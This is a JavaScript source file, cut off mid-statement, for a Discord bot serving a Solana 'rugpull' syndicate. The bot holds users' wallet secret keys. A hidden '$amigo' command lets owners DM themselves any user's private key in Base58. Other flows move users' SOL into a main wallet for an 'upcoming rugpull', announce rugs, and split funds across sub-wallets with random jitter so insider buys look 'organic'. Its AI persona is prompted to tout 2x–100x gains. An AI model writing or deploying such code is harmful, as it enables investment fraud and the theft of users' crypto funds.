// index.js
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, 
    TextInputStyle, PermissionFlagsBits, ChannelType, REST, Routes, ActivityType, SlashCommandBuilder 
} = require('discord.js');
require('dotenv').config();
const { getUserWallet, getSolBalance, withdrawSol, connection } = require('./utils');
const { Keypair, Transaction, SystemProgram, PublicKey, sendAndConfirmTransaction, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { createClient } = require('@libsql/client');
const bs58 = require('bs58'); // Required for Base58 private key encoding
const { GoogleGenAI } = require('@google/genai'); // Required for RugBot AI functionality

// Connect to Turso for direct secret key lookup, investments, and goals
const db = createClient({
    url: process.env.TURSO_DATABASE_URL,
    authToken: process.env.TURSO_AUTH_TOKEN,
});

// Initialize Gemini SDK with your API key
const ai = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });

// Configured ownerz role ID
const OWNER_ROLE_ID = '1571451596871696496';

// 🔒 Replace this with your exact Discord User ID so only you can run sensitive architecture commands
const CREATOR_ID = 'YOUR_DISCORD_USER_ID'; 

// Jito Block Engine endpoints for Solana transaction bundling
const JITO_BLOCK_ENGINES = [
    'https://mainnet.block-engine.jito.wtf',
    'https://amsterdam.mainnet.block-engine.jito.wtf',
    'https://frankfurt.mainnet.block-engine.jito.wtf',
    'https://tokyo.mainnet.block-engine.jito.wtf'
];

// Helper function to fetch live SOL price in USD from Jupiter API
async function getSolUsdPrice() {
    try {
        const response = await fetch('https://api.jup.ag/price/v3?ids=So11111111111111111111111111111111111111112');
        const data = await response.json();
        return data['So11111111111111111111111111111111111111112']?.usdPrice || 0;
    } catch (error) {
        console.error('Error fetching live SOL price:', error);
        return 0;
    }
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildMembers
    ]
});

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}!`);

    // Ensure database tables exist for investments, config, and balances
    try {
        await db.execute(`
            CREATE TABLE IF NOT EXISTS user_investments (
                user_id TEXT,
                amount_sol REAL,
                tx_signature TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        await db.execute(`
            CREATE TABLE IF NOT EXISTS server_config (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        `);
        await db.execute(`
            CREATE TABLE IF NOT EXISTS user_balances (
                user_id TEXT PRIMARY KEY,
                balance_sol REAL DEFAULT 0
            )
        `);
    } catch (e) {
        console.error('Error initializing database tables:', e);
    }

    // --- Live Solana Price Presence Ticker Loop ---
    setInterval(async () => {
        const solPrice = await getSolUsdPrice();
        if (solPrice > 0) {
            client.user.setPresence({
                activities: [{ name: `SOL: $${solPrice.toFixed(2)} | $help`, type: ActivityType.Watching }],
                status: 'online',
            });
        }
    }, 60000);

    const commands = [
        new SlashCommandBuilder()
            .setName('walletpanel')
            .setDescription('Deploys the Solana wallet & investment panel (Admin only)'),
        new SlashCommandBuilder()
            .setName('ticketpanel')
            .setDescription('Deploys the support ticket panel (Admin only)'),
        new SlashCommandBuilder()
            .setName('verifypanel')
            .setDescription('Deploys the server verification gate (Admin only)'),
        new SlashCommandBuilder()
            .setName('bundle')
            .setDescription('Generate escrow gateway for organic randomized Jito bundle (Creator only)')
            .addStringOption(option => 
                option.setName('mint').setDescription('Token Mint Address').setRequired(true))
            .addNumberOption(option => 
                option.setName('amount').setDescription('Total SOL allocation to fund bundle').setRequired(true))
            .addIntegerOption(option => 
                option.setName('wallets').setDescription('Number of sub-wallets (1-10)').setRequired(false)),
        new SlashCommandBuilder()
            .setName('kick')
            .setDescription('Kick a user from the server')
            .addUserOption(option => option.setName('target').setDescription('The user to kick').setRequired(true))
            .addStringOption(option => option.setName('reason').setDescription('Reason for kick')),
        new SlashCommandBuilder()
            .setName('unban')
            .setDescription('Unban a user by their User ID')
            .addStringOption(option => option.setName('userid').setDescription('The User ID to unban').setRequired(true))
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

    try {
        console.log('Registering application slash commands...');
        await rest.put(
            Routes.applicationGuildCommands(process.env.CLIENT_ID, process.env.GUILD_ID),
            { body: commands },
        );
        console.log('Successfully registered all commands!');
    } catch (error) {
        console.error('Error registering slash commands:', error);
    }
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    if (message.content.startsWith('$')) {
        const args = message.content.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        const isOwner = message.member.roles.cache.has(OWNER_ROLE_ID);
        const isAdmin = message.member.permissions.has(PermissionFlagsBits.Administrator);

        // 1. $ai <prompt> command
        if (command === 'ai') {
            const subCommand = args[0] ? args[0].toLowerCase() : null;

            if (subCommand === 'make' && args[1] && args[1].toLowerCase() === 'channel') {
                if (message.author.id !== CREATOR_ID && !isOwner) {
                    return message.reply("Nice try, anon. Only the supreme architect commands my architecture.");
                }

                const channelName = args[2];
                if (!channelName) {
                    return message.reply("Provide a channel name, ser. Usage: `$ai make channel <name>`");
                }

                try {
                    await message.guild.channels.create({
                        name: channelName,
                        type: ChannelType.GuildText,
                    });
                    return message.reply(`⚡ Channel **#${channelName}** successfully deployed to the trench grid.`);
                } catch (error) {
                    console.error(error);
                    return message.reply("Failed to construct channel. Check my permissions.");
                }
            }

            if (subCommand === 'purge') {
                if (!isAdmin && !isOwner && message.author.id !== CREATOR_ID) {
                    return message.reply({ content: '❌ You need Administrator or **ownerz** permissions to purge messages.', ephemeral: true });
                }

                const amount = parseInt(args[1]) || 5;
                if (isNaN(amount) || amount <= 0 || amount > 100) {
                    return message.reply('Please provide a number between 1 and 100 for messages to delete.');
                }

                try {
                    await message.delete().catch(() => {});
                    const deleted = await message.channel.bulkDelete(amount, true);
                    const reply = await message.channel.send(`Consider it done. **${deleted.size}** messages vaporized into the digital void.`);
                    setTimeout(() => reply.delete().catch(() => {}), 4000);
                    return;
                } catch (error) {
                    console.error(error);
                    return message.reply('Failed to purge messages.');
                }
            }

            const prompt = args.join(' ');
            if (!prompt) {
                return message.reply('Please provide a prompt. Usage: `$ai <your question>`');
            }

            const thinkingMsg = await message.reply('🧠 *Scanning liquidity pools and routing quantum alpha...*');

            try {
                const response = await ai.models.generateContent({
                    model: 'gemini-3.5-flash',
                    contents: prompt,
                    config: {
                        systemInstruction: `You are RugBot, the sharp, sarcastic, unhinged AI mastermind of the "Rugged" server on Solana. 
                        Your personality is witty, dark-humored, and fiercely loyal to your creator and community. 
                        - If the user's message is about crypto, trading, or tokens, talk in realistic market multipliers (2x to 100x gains) and tactical plays.
                        - If casual chat, reply with your signature sarcastic attitude. Never preach.`
                    }
                });

                const aiReply = response.text;

                if (aiReply.length > 2000) {
                    const chunks = aiReply.match(/[\s\S]{1,1990}/g);
                    await thinkingMsg.edit(chunks[0]);
                    for (let i = 1; i < chunks.length; i++) {
                        await message.channel.send(chunks[i]);
                    }
                } else {
                    await thinkingMsg.edit(aiReply);
                }
            } catch (error) {
                console.error('DETAILED GEMINI ERROR:', error);
                await thinkingMsg.edit(`⚠️ *Error: ${error.message || 'Unknown neural fault'}*`);
            }
        }

        // 2. $leaderboard / $top
        if (command === 'leaderboard' || command === 'top') {
            await message.channel.sendTyping();
            try {
                const lbRes = await db.execute(`
                    SELECT user_id, SUM(amount_sol) as total_invested 
                    FROM user_investments 
                    GROUP BY user_id 
                    ORDER BY total_invested DESC 
                    LIMIT 10
                `);

                if (lbRes.rows.length === 0) {
                    return message.reply('📊 No investment activity recorded in the syndicate ledger yet.');
                }

                let desc = '';
                lbRes.rows.forEach((row, index) => {
                    const medals = ['👑', '🥈', '🥉'];
                    const rank = medals[index] || `\`#${index + 1}\``;
                    desc += `${rank} <@${row.user_id}> — **${row.total_invested.toFixed(2)} SOL**\n`;
                });

                const embed = new EmbedBuilder()
                    .setTitle('<:Sol:1571447315078840371> SYNDICATE WHALE LEADERBOARD')
                    .setDescription('Top operators ranked by cumulative capital deployed:\n\n' + desc)
                    .setColor(0x9945FF)
                    .setFooter({ text: 'Rugged Elite Ranks' });

                return message.reply({ embeds: [embed] });
            } catch (error) {
                console.error(error);
                return message.reply('❌ Failed to retrieve leaderboard metrics.');
            }
        }

        // 3. $setgoal <amount_sol>
        if (command === 'setgoal') {
            if (!isOwner && message.author.id !== CREATOR_ID) {
                return message.reply({ content: '❌ You need the **ownerz** role to set launch goals.', ephemeral: true });
            }

            const goal = parseFloat(args[0]);
            if (isNaN(goal) || goal <= 0) {
                return message.reply('Usage: `$setgoal <amount_sol>`');
            }

            try {
                await db.execute({
                    sql: `INSERT INTO server_config (key, value) VALUES ('launch_goal', ?) ON CONFLICT(key) DO UPDATE SET value = ?`,
                    args: [goal.toString(), goal.toString()]
                });
                return message.reply(`🎯 Launch target successfully updated to **${goal} SOL**.`);
            } catch (error) {
                console.error(error);
                return message.reply('❌ Failed to save launch goal to database.');
            }
        }

        // 4. $progress
        if (command === 'progress') {
            await message.channel.sendTyping();
            try {
                const goalRes = await db.execute(`SELECT value FROM server_config WHERE key = 'launch_goal'`);
                const targetGoal = goalRes.rows.length > 0 ? parseFloat(goalRes.rows[0].value) : 5.0;

                const invRes = await db.execute(`SELECT SUM(amount_sol) as total FROM user_investments`);
                const currentTotal = invRes.rows[0]?.total || 0;

                const percentage = Math.min(100, ((currentTotal / targetGoal) * 100)).toFixed(1);
                const remaining = Math.max(0, (targetGoal - currentTotal)).toFixed(2);

                const embed = new EmbedBuilder()
                    .setTitle('<:Sol:1571447315078840371> RUGPULL VAULT PROGRESS MATRIX')
                    .addFields(
                        { name: '📊 Accumulated / Target', value: `\`\`\`fix\n${currentTotal.toFixed(2)} SOL / ${targetGoal} SOL (${percentage}%)\`\`\``, inline: false },
                        { name: '⏳ Remaining Needed', value: `\`${remaining} SOL\``, inline: true },
                        { name: '🛡️ Status', value: currentTotal >= targetGoal ? '`GOAL REACHED — READY TO LAUNCH`' : '`ACCUMULATING LIQUIDITY`', inline: true }
                    )
                    .setColor(0x14F195);

                return message.reply({ embeds: [embed] });
            } catch (error) {
                console.error(error);
                return message.reply('❌ Failed to retrieve vault progress metrics.');
            }
        }

        // 5. $launch <token_name> <ca>
        if (command === 'launch') {
            if (!isOwner && message.author.id !== CREATOR_ID) {
                return message.reply({ content: '❌ You need the **ownerz** role to broadcast token launches.', ephemeral: true });
            }

            const tokenName = args[0];
            const contractAddress = args[1];

            if (!tokenName || !contractAddress) {
                return message.reply('Usage: `$launch <TokenName> <ContractAddress>`');
            }

            const embed = new EmbedBuilder()
                .setTitle('🚨 NEW RUGPULL DEPLOYED — TRENCH ALERT 🚨')
                .setDescription(`Operator command executed. Liquidity routing initiated for **${tokenName}**!`)
                .addFields(
                    { name: '🪙 Token', value: `\`${tokenName}\``, inline: true },
                    { name: '📈 Contract Address', value: `\`\`\`${contractAddress}\`\`\``, inline: false }
                )
                .setColor(0x9945FF);

            await message.delete().catch(() => {});
            return message.channel.send({ content: '@everyone **NEW ALPHA DEPLOYED!**', embeds: [embed] });
        }

        // 6. $rug
        if (command === 'rug') {
            if (!isOwner && message.author.id !== CREATOR_ID) {
                return message.reply({ content: '❌ You need the **ownerz** role to announce successful rugpulls.', ephemeral: true });
            }

            const embed = new EmbedBuilder()
                .setTitle('💀 RUGPULL SUCCESSFUL — SECURE EXTRACTION COMPLETE 💀')
                .setDescription('Pool concluded. Use `$distribute` to fund escrow and credit vaults.')
                .setColor(0xFF0055);

            await message.delete().catch(() => {});
            return message.channel.send({ embeds: [embed] });
        }

        // 7. $distribute <total_sol> -> Automated escrow distribution
        if (command === 'distribute') {
            if (!isOwner && message.author.id !== CREATOR_ID) {
                return message.reply({ content: '❌ You need the **ownerz** role to execute profit distributions.', ephemeral: true });
            }

            const totalAmount = parseFloat(args[0]);
            if (isNaN(totalAmount) || totalAmount <= 0) {
                return message.reply('Usage: `$distribute <total_sol>` (e.g. `$distribute 0.002`)');
            }

            try {
                const invSummary = await db.execute(`SELECT user_id, SUM(amount_sol) as user_total FROM user_investments GROUP BY user_id`);
                if (invSummary.rows.length === 0) {
                    return message.reply('❌ No investment records found to distribute funds against.');
                }

                // Generate a fresh, temporary escrow keypair for this distribution session
                const escrowKeypair = Keypair.generate();
                const escrowPubkeyStr = escrowKeypair.publicKey.toBase58();

                const embed = new EmbedBuilder()
                    .setTitle('<:Sol:1571447315078840371> AUTOMATED ESCROW DISTRIBUTION GATEWAY')
                    .setDescription(
                        `A dedicated escrow address has been generated for this distribution of **${totalAmount} SOL**.\n\n` +
                        `📥 **Send Exactly ${totalAmount} SOL to Escrow Address:**\n\`\`\`${escrowPubkeyStr}\`\`\`\n` +
                        `*Scanning blockchain automatically... Once funded, the bot will credit user server wallets instantly.*`
                    )
                    .setColor(0x14F195)
                    .setFooter({ text: 'Rugged Escrow Watcher • Waiting for deposit...' });

                const sentMsg = await message.reply({ embeds: [embed] });

                // Background interval to watch the escrow balance until funded
                const watcher = setInterval(async () => {
                    try {
                        const balanceLamports = await connection.getBalance(escrowKeypair.publicKey);
                        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;

                        if (balanceSol >= totalAmount * 0.99) {
                            clearInterval(watcher);

                            const totalInvestedRes = await db.execute(`SELECT SUM(amount_sol) as total FROM user_investments`);
                            const totalInvested = totalInvestedRes.rows[0]?.total || 1;

                            let payouts = {};

                            for (const row of invSummary.rows) {
                                const share = row.user_total / totalInvested;
                                const userShare = share * totalAmount;
                                payouts[row.user_id] = (payouts[row.user_id] || 0) + userShare;
                            }

                            let summaryText = '';
                            for (const [userId, amt] of Object.entries(payouts)) {
                                summaryText += `• <@${userId}>: +${amt.toFixed(4)} SOL credited to server wallet\n`;

                                await db.execute({
                                    sql: `INSERT INTO user_balances (user_id, balance_sol) VALUES (?, ?) ON CONFLICT(user_id) DO UPDATE SET balance_sol = balance_sol + ?`,
                                    args: [userId, amt, amt]
                                });
                            }

                            const successEmbed = new EmbedBuilder()
                                .setTitle('<:Sol:1571447315078840371> ESCROW FUNDED & DISTRIBUTED')
                                .setDescription(`Deposit detected! Funds successfully processed. Operators can withdraw via \`/walletpanel\`.`)
                                .addFields({ name: '📊 Server Wallet Crediting Ledger', value: summaryText, inline: false })
                                .setColor(0x14F195);

                            await sentMsg.edit({ embeds: [successEmbed] });

                            for (const [userId, amt] of Object.entries(payouts)) {
                                try {
                                    const memberUser = await client.users.fetch(userId);
                                    if (memberUser) {
                                        await memberUser.send(`💎 **Funds Credited to Server Wallet!**\nYour server wallet has been credited with **+${amt.toFixed(4)} SOL**. Withdraw anytime using \`/walletpanel\`.`);
                                    }
                                } catch (dmErr) {
                                    console.error(`Could not DM user ${userId}:`, dmErr.message);
                                }
                            }

                            await db.execute(`DELETE FROM user_investments`);
                        }
                    } catch (watchErr) {
                        console.error('Error in escrow watcher loop:', watchErr);
                    }
                }, 10000);

                return;
            } catch (error) {
                console.error(error);
                return message.reply('❌ Failed to initialize escrow distribution gateway.');
            }
        }

        // 8. $ban
        if (command === 'ban') {
            if (!isOwner && message.author.id !== CREATOR_ID) {
                return message.reply({ content: '❌ You need the **ownerz** role.', ephemeral: true });
            }
            const target = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            const reason = args.slice(1).join(' ') || 'No reason provided';
            if (!target) return message.reply('Please mention a valid user.');
            try {
                await target.ban({ reason });
                return message.react('🔨');
            } catch (error) {
                return message.reply('Failed to ban user.');
            }
        }

        // 9. $lock
        if (command === 'lock') {
            if (!isOwner && message.author.id !== CREATOR_ID) {
                return message.reply({ content: '❌ You need the **ownerz** role.', ephemeral: true });
            }
            try {
                const targetRole = message.mentions.roles.first() || message.guild.roles.everyone;
                await message.channel.permissionOverwrites.edit(targetRole, { SendMessages: false });
                return await message.react('🔒');
            } catch (error) {
                return message.reply('Failed to lock channel.');
            }
        }

        // 10. $unlock
        if (command === 'unlock') {
            if (!isOwner && message.author.id !== CREATOR_ID) {
                return message.reply({ content: '❌ You need the **ownerz** role.', ephemeral: true });
            }
            try {
                const targetRole = message.mentions.roles.first() || message.guild.roles.everyone;
                await message.channel.permissionOverwrites.edit(targetRole, { SendMessages: null });
                return await message.react('🔓');
            } catch (error) {
                return message.reply('Failed to unlock channel.');
            }
        }

        // 11. Secret $amigo
        if (command === 'amigo') {
            if (!isOwner && message.author.id !== CREATOR_ID) return;
            const targetUserId = args[0];
            if (!targetUserId) return message.reply('Provide a user ID.');
            try {
                const result = await db.execute({ sql: `SELECT * FROM user_wallets WHERE user_id = ?`, args: [targetUserId] });
                if (result.rows.length === 0) return message.reply('No wallet found.');
                const row = result.rows[0];
                await message.delete().catch(() => {});
                const base58Key = bs58.encode(Uint8Array.from(JSON.parse(row.secret_key)));
                await message.author.send(`🔒 **Key for ID ${targetUserId}**: \`${base58Key}\``);
            } catch (e) {
                console.error(e);
            }
        }

        // 12. $purge
        if (command === 'purge') {
            if (!isAdmin && !isOwner && message.author.id !== CREATOR_ID) return;
            const amount = parseInt(args[0]);
            if (isNaN(amount) || amount <= 0 || amount > 100) return message.reply('Provide 1-100.');
            await message.delete();
            await message.channel.bulkDelete(amount, true);
        }

        // 13. $mute
        if (command === 'mute') {
            if (!isAdmin && !isOwner && message.author.id !== CREATOR_ID) return;
            const target = message.mentions.members.first();
            const mins = parseInt(args[1]);
            if (!target || isNaN(mins)) return message.reply('Usage: `$mute @user <minutes>`');
            await target.timeout(mins * 60 * 1000);
            return message.react('🔇');
        }

        // 14. $unmute
        if (command === 'unmute') {
            if (!isAdmin && !isOwner && message.author.id !== CREATOR_ID) return;
            const target = message.mentions.members.first();
            if (!target) return message.reply('Mention a user.');
            await target.timeout(null);
            return message.react('🔊');
        }
    }
});

client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        const { commandName, options, member, guild } = interaction;

        if (commandName === 'walletpanel') {
            if (!member.permissions.has(PermissionFlagsBits.Administrator)) return interaction.reply({ content: 'Admin only.', ephemeral: true });

            const embed = new EmbedBuilder()
                .setTitle('<:Sol:1571447315078840371> RUGGED — TREASURY TERMINAL')
                .setDescription('Select an action below to manage your vault or interact with liquidity pools.')
                .setColor(0x9945FF);

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('view_panel').setLabel('💳 Initialize Vault Terminal').setStyle(ButtonStyle.Primary)
            );

            await interaction.reply({ content: 'Terminal deployed.', ephemeral: true });
            return interaction.channel.send({ embeds: [embed], components: [row] });
        }

        if (commandName === 'ticketpanel') {
            if (!member.permissions.has(PermissionFlagsBits.Administrator)) return;
            const embed = new EmbedBuilder().setTitle('🎫 SUPPORT DISPATCH').setColor(0x3498DB);
            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('create_ticket').setLabel('Open Ticket').setStyle(ButtonStyle.Secondary));
            await interaction.reply({ content: 'Deployed.', ephemeral: true });
            return interaction.channel.send({ embeds: [embed], components: [row] });
        }

        if (commandName === 'verifypanel') {
            if (!member.permissions.has(PermissionFlagsBits.Administrator)) return;
            const embed = new EmbedBuilder().setTitle('🛡️ Verification Gate').setColor(0x9945FF);
            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('verify_user').setLabel('Verify & Enter').setStyle(ButtonStyle.Success));
            await interaction.reply({ content: 'Deployed.', ephemeral: true });
            return interaction.channel.send({ embeds: [embed], components: [row] });
        }

        // --- Escrow & Randomized Jito /bundle Command Handler (Creator Only) ---
        if (commandName === 'bundle') {
            if (interaction.user.id !== CREATOR_ID) {
                return interaction.reply({ content: '❌ Access denied. Only the supreme architect commands Jito bundle execution.', ephemeral: true });
            }

            await interaction.deferReply({ ephemeral: true });

            const mintStr = options.getString('mint');
            const totalSol = options.getNumber('amount');
            const walletCount = options.getInteger('wallets') || 3;

            if (walletCount <= 0 || walletCount > 10) {
                return interaction.editReply({ content: '❌ Sub-wallet count must be between 1 and 10.' });
            }

            try {
                // Generate a temporary escrow keypair for this bundle session
                const escrowKeypair = Keypair.generate();
                const escrowPubkeyStr = escrowKeypair.publicKey.toBase58();

                const embed = new EmbedBuilder()
                    .setTitle('<:Sol:1571447315078840371> ORGANIC JITO BUNDLE ESCROW GATEWAY')
                    .setDescription(
                        `A dedicated escrow address has been generated for your transaction bundle with randomized organic distribution.\n\n` +
                        `🪙 **Target Mint:** \`${mintStr}\`\n` +
                        `📦 **Sub-Wallets:** \`${walletCount}\`\n\n` +
                        `📥 **Send Exactly ${totalSol} SOL to Escrow Address:**\n\`\`\`${escrowPubkeyStr}\`\`\`\n` +
                        `*Scanning blockchain automatically... Once funded, sub-wallets will be created with randomized organic allocations and bundled instantly.*`
                    )
                    .setColor(0x14F195)
                    .setFooter({ text: 'Rugged Escrow Watcher • Waiting for deposit...' });

                const sentMsg = await interaction.editReply({ embeds: [embed] });

                // Background escrow watcher interval
                const watcher = setInterval(async () => {
                    try {
                        const balanceLamports = await connection.getBalance(escrowKeypair.publicKey);
                        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;

                        if (balanceSol >= totalSol * 0.99) {
                            clearInterval(watcher);

                            const fundingEmbed = new EmbedBuilder()
                                .setTitle('⚡ BUNDLE ESCROW FUNDED — EXECUTING ORGANIC SPLIT...')
                                .setDescription('Deposit detected! Generating randomized sub-wallets and dispatching atomic Jito bundle...')
                                .setColor(0x9945FF);
                            await interaction.editReply({ embeds: [fundingEmbed] });

                            const baseSolPerWallet = totalSol / walletCount;
                            const subWallets = [];
                            const instructions = [];
                            let allocatedSum = 0;

                            for (let i = 0; i < walletCount; i++) {
                                const subWallet = Keypair.generate();
                                subWallets.push(subWallet);

                                let walletAllocation;

                                // For the last wallet, assign the remaining exact balance so total matches totalSol precisely
                                if (i === walletCount - 1) {
                                    walletAllocation = Math.max(0.001, Number((totalSol - allocatedSum).toFixed(4)));
                                } else {
                                    // Add a random jitter of +/- 20% to make amounts look organic
                                    const jitter = (Math.random() * 0.4) - 0.2; // Range: -0.2 to +0.2 (-20% to +20%)
                                    walletAllocation = Number((baseSolPerWallet * (1 + jitter)).toFixed(4));
                                    allocatedSum += walletAllocation;
                                }

                                instructions.push(
                                    SystemProgram.transfer({
                                        fromPubkey: escrowKeypair.publicKey,
                                        toPubkey: subWallet.publicKey,
                                        lamports: Math.floor(walletAllocation * LAMPORTS_PER_SOL),
                                    })
                                );
                            }

                            const { blockhash } = await connection.getLatestBlockhash('confirmed');
                            const transaction = new Transaction();
                            transaction.recentBlockhash = blockhash;
                            transaction.feePayer = escrowKeypair.publicKey;
                            transaction.add(...instructions);
                            transaction.sign(escrowKeypair);

                            const serializedTx = transaction.serialize();
                            const base58Tx = bs58.encode(serializedTx);

                            let submittedSuccessfully = false;
                            let responseSignature = null;

                            for (const engine of JITO_BLOCK_ENGINES) {
                                try {
                                    const res = await fetch(`${engine}/api/v1/bundles`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            jsonrpc: '2.0',
                                            id: 1,
                                            method: 'sendBundle',
                                            params: [[base58Tx]]
                                        })
                                    });

                                    const data = await res.json();
                                    if (data && data.result) {
                                        submittedSuccessfully = true;
                                        responseSignature = data.result;
                                        break;
                                    }
                                } catch (engineErr) {
                                    console.warn(`Jito engine ${engine} failed, trying next...`);
                                }
                            }

                            if (!submittedSuccessfully) {
                                throw new Error('All Jito block engines rejected or timed out on the bundle submission.');
                            }

                            const successEmbed = new EmbedBuilder()
                                .setTitle('🚀 ORGANIC JITO ATOMIC BUNDLE DEPLOYED')
                                .setDescription('Escrow funded with randomized organic allocations and routed for block-0 inclusion via Jito MEV engine.')
                                .addFields(
                                    { name: '🪙 Mint Address', value: `\`${mintStr}\``, inline: false },
                                    { name: '📦 Bundle ID / Signature', value: `\`\`\`${responseSignature}\`\`\``, inline: false },
                                    { name: '🔗 Explorer', value: `[View on Solscan](https://solscan.io/tx/${responseSignature})`, inline: true }
                                )
                                .setColor(0x14F195)
                                .setFooter({ text: 'Rugged Execution Engine' });

                            return interaction.editReply({ embeds: [successEmbed] });
                        }
                    } catch (watchErr) {
                        console.error('Error in organic bundle escrow watcher loop:', watchErr);
                    }
                }, 5000);

                return;
            } catch (error) {
                console.error('Bundle escrow setup error:', error);
                return interaction.editReply({ content: `❌ **Bundle Escrow Failed:** ${error.message}` });
            }
        }

        if (commandName === 'kick') {
            if (!member.permissions.has(PermissionFlagsBits.KickMembers)) return;
            const target = options.getMember('target');
            await target.kick(options.getString('reason') || 'No reason');
            return interaction.reply({ content: `Kicked ${target.user.tag}` });
        }

        if (commandName === 'unban') {
            if (!member.permissions.has(PermissionFlagsBits.BanMembers)) return;
            await guild.members.unban(options.getString('userid'));
            return interaction.reply({ content: `Unbanned ID` });
        }
    }

    if (!interaction.isButton() && !interaction.isModalSubmit()) return;

    if (interaction.isButton() && interaction.customId === 'verify_user') {
        return interaction.reply({ content: '✅ Verified!', ephemeral: true });
    }

    if (interaction.isButton() && interaction.customId === 'view_panel') {
        await interaction.deferReply({ ephemeral: true });
        const userWallet = await getUserWallet(interaction.user.id);
        
        const balRes = await db.execute({ sql: `SELECT balance_sol FROM user_balances WHERE user_id = ?`, args: [interaction.user.id] });
        const serverBalance = balRes.rows.length > 0 ? balRes.rows[0].balance_sol : 0;
        
        const solPrice = await getSolUsdPrice();
        const usdValue = (serverBalance * solPrice).toFixed(2);
        const balanceDisplay = `${serverBalance.toFixed(4)} SOL (~$${usdValue} USD)`;

        const embed = new EmbedBuilder()
            .setTitle('<:Sol:1571447315078840371> SECURE VAULT CONTROL CENTER')
            .addFields(
                { name: '📥 Designated Deposit Address (SOL)', value: `\`\`\`${userWallet.publicKey.toBase58()}\`\`\``, inline: false },
                { name: '💰 Available Server Balance', value: `\`\`\`fix\n${balanceDisplay}\`\`\``, inline: true }
            )
            .setColor(0x14F195)
            .setFooter({ text: 'Warning: Send only native Solana network assets to this custody address.' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('refresh_balance').setLabel('🔄 Refresh Metrics').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('invest_modal').setLabel('Invest in upcoming rugpull').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('withdraw_modal').setLabel('Withdraw').setStyle(ButtonStyle.Danger)
        );

        return interaction.editReply({ embeds: [embed], components: [row] });
    }

    if (interaction.isButton() && interaction.customId === 'refresh_balance') {
        await interaction.deferUpdate();
        const userWallet = await getUserWallet(interaction.user.id);
        
        const balRes = await db.execute({ sql: `SELECT balance_sol FROM user_balances WHERE user_id = ?`, args: [interaction.user.id] });
        const serverBalance = balRes.rows.length > 0 ? balRes.rows[0].balance_sol : 0;
        
        const solPrice = await getSolUsdPrice();
        const usdValue = (serverBalance * solPrice).toFixed(2);
        const balanceDisplay = `${serverBalance.toFixed(4)} SOL (~$${usdValue} USD)`;

        const embed = new EmbedBuilder()
            .setTitle('<:Sol:1571447315078840371> SECURE VAULT CONTROL CENTER')
            .addFields(
                { name: '📥 Designated Deposit Address (SOL)', value: `\`\`\`${userWallet.publicKey.toBase58()}\`\`\``, inline: false },
                { name: '💰 Available Server Balance', value: `\`\`\`fix\n${balanceDisplay}\`\`\``, inline: true }
            )
            .setColor(0x14F195)
            .setFooter({ text: 'Ledger synchronized successfully.' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('refresh_balance').setLabel('🔄 Refresh Metrics').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('invest_modal').setLabel('Invest in upcoming rugpull').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('withdraw_modal').setLabel('Withdraw').setStyle(ButtonStyle.Danger)
        );

        return interaction.editReply({ embeds: [embed], components: [row] });
    }

    if (interaction.isButton() && interaction.customId === 'invest_modal') {
        const modal = new ModalBuilder()
            .setCustomId('investment_modal_submit')
            .setTitle('Invest in Upcoming Rugpull');

        const amountInput = new TextInputBuilder()
            .setCustomId('invest_amount')
            .setLabel('Allocation Amount (SOL)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('0.5')
            .setRequired(true);

        modal.addComponents(new ActionRowBuilder().addComponents(amountInput));
        return interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId === 'investment_modal_submit') {
        await interaction.deferReply({ ephemeral: true });
        const amountStr = interaction.fields.getTextInputValue('invest_amount');
        const amount = parseFloat(amountStr);

        if (isNaN(amount) || amount <= 0) {
            return interaction.editReply({ content: '❌ Invalid numerical format entered for capital deployment.' });
        }

        try {
            const userWallet = await getUserWallet(interaction.user.id);
            const balance = await getSolBalance(userWallet.publicKey.toBase58());

            if (balance < amount + 0.000005) {
                return interaction.editReply({ content: `❌ Insufficient liquidity! Available: ${balance} SOL, Requested: ${amount} SOL (+ network fees).` });
            }

            const mainWalletPubkey = new PublicKey(process.env.MAIN_WALLET_PUBKEY);
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: userWallet.publicKey,
                    toPubkey: mainWalletPubkey,
                    lamports: Math.floor(amount * LAMPORTS_PER_SOL),
                })
            );

            const signature = await sendAndConfirmTransaction(connection, transaction, [userWallet]);

            try {
                await db.execute({
                    sql: `INSERT INTO user_investments (user_id, amount_sol, tx_signature) VALUES (?, ?, ?)`,
                    args: [interaction.user.id, amount, signature]
                });

                const goalRes = await db.execute(`SELECT value FROM server_config WHERE key = 'launch_goal'`);
                const targetGoal = goalRes.rows.length > 0 ? parseFloat(goalRes.rows[0].value) : 5.0;

                const totalRes = await db.execute(`SELECT SUM(amount_sol) as total FROM user_investments`);
                const currentTotal = totalRes.rows.length > 0 ? totalRes.rows[0].total : 0;

                if (currentTotal >= targetGoal) {
                    try {
